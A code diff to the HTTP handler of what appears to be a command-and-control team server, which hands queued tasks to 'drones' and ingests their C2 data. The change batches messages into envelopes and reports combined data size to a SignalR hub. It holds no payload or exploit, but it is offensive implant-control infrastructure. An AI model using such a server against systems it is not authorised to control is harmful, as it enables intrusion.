@@ -1,11 +1,13 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Threading.Tasks;
 
 using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.AspNetCore.SignalR;
+
 using TeamServer.Hubs;
 using TeamServer.Interfaces;
 using TeamServer.Models;
@@ -45,11 +47,13 @@ namespace TeamServer.Handlers
             }
 
             // get anything outbound
-            var message = await _tasks.GetDroneTasks(metadata);
+            var envelopes = (await _tasks.GetDroneTasks(metadata)).ToArray();
 
-            if (message is null) return NoContent();
-            await _hub.Clients.All.DroneDataSent(metadata.Guid, message.Data.Length);
-            return Ok(message);
+            if (!envelopes.Any()) return NoContent();
+
+            var dataLength = envelopes.Sum(e => e.Data.Length);
+            await _hub.Clients.All.DroneDataSent(metadata, dataLength);
+            return Ok(envelopes);
         }
 
         private static DroneMetadata ExtractMetadata(IHeaderDictionary headers)
@@ -66,10 +70,10 @@ namespace TeamServer.Handlers
 
         private async Task ExtractMessagesFromBody(string body)
         {
-            var messages = body.Deserialize<IEnumerable<C2Message>>();
-            if (messages is null) return;
+            var envelopes = body.Deserialize<IEnumerable<MessageEnvelope>>();
+            if (envelopes is null) return;
 
-            await _tasks.RecvC2Data(messages);
+            await _tasks.RecvC2Data(envelopes);
         }
     }
 }
